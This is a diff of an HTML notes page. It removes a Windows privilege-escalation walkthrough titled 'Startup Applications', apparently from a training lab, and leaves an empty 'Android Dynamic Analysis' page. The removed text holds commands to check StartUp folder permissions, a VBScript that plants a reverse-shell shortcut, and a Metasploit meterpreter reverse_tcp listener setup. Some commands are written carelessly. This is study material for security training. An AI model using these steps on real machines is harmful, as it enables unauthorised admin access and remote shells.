@@ -64,29 +64,7 @@
 
 
 <!--==================== MAIN ====================-->
-    <main class="main"><article id="c46ca5ac-38fa-4c59-be02-1c4b62732070" class="page sans"><header><h1 class="page-title">Startup Applications</h1></header><div class="page-body"><p id="25c9b37a-cf1f-4f0b-b54b-e5e5e1eeeb28" class="">
-</p><p id="ec007856-e0b6-4287-b188-53fe556c7e4d" class="">
-</p><pre id="3979c804-56a5-43c7-bbaa-651a12db7b46" class="code"><code>#Using accesschk.exe, note that the BUILTIN\Users group can write files to the StartUp directory:
-C:\PrivEsc\accesschk.exe /accepteula -d &quot;C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp&quot;
-#Using cscript, run the C:\PrivEsc\CreateShortcut.vbs script which should create a new shortcut to your reverse.exe executable in the StartUp directory:
-cscript C:\PrivEsc\CreateShortcut.vbs
-#Start a listener on Kali, and then simulate an admin logon using RDP and the credentials you previously extracted:
-rdesktop -u admin 0.0.0.0</code></pre><p id="55655d81-f443-4db8-aac3-7d725656a2b2" class="">Similar to autoruns:</p><pre id="bb1e3346-6938-45cd-b057-ede65ff2835f" class="code"><code>icacls.exe &quot;C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup&quot;
-#Notice the groups with F (Full access)
-copy program.exe &quot;C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\&quot;</code></pre><p id="2377b0b3-fb6d-4d1a-bfc8-9ca50fad3312" class="">If startup as full read write execute access we can continue</p><p id="eae7f1e7-f84a-4869-a97d-498eb07963ec" class="">
-</p><pre id="b46e5e2a-43d9-4a7a-8110-b9bbec7670b6" class="code"><code>msfconsole user multi/handler
-payload windows/meterpreter/reverse_tcp
-
-#send to http server
-Computer -&gt; C:ProgramData
-Microsoft\Windows\Start Menu\Startup
-#log out and start up as another user</code></pre><p id="01a08bcd-580f-4fb1-a08d-03d692823d03" class="">
-</p><pre id="7d1b9cf5-bad9-434c-a9eb-19678bfdb373" class="code"><code>.\accesschk.exe /accepteula -d &quot;C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp&quot;</code></pre><p id="43d960fe-75f7-445f-a034-0825674beec6" class="">CreateShortcut.vbs</p><pre id="11424911-f972-4942-84e3-bf9410ff2a06" class="code"><code>Set oWS = WScript.CreateObject(&quot;WScript.Shell&quot;)
-sLinkFile = &quot;C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\reverse.lnk&quot;
-Set oLink = oWS.CreateShortcut(sLinkFile)
-oLink.TargetPath = &quot;C:\reverse.exe&quot;
-oLink.Save</code></pre><p id="c596c297-5770-46cf-b30f-59cd3a802064" class="">To run:</p><pre id="56c85d1c-1c85-4b74-a40a-c1f13c6b6c04" class="code"><code>cscript CreateShortcut.vbs
-</code></pre></div></article></main></main>
+    <main class="main"><article id="345aba63-8f61-44b1-8fa6-9dd83b191e47" class="page sans"><header><h1 class="page-title">Android Dynamic Analysis</h1></header><div class="page-body"></div></article></main></main>
 
     <!--==================== FOOTER ====================-->
     <footer class="footer">
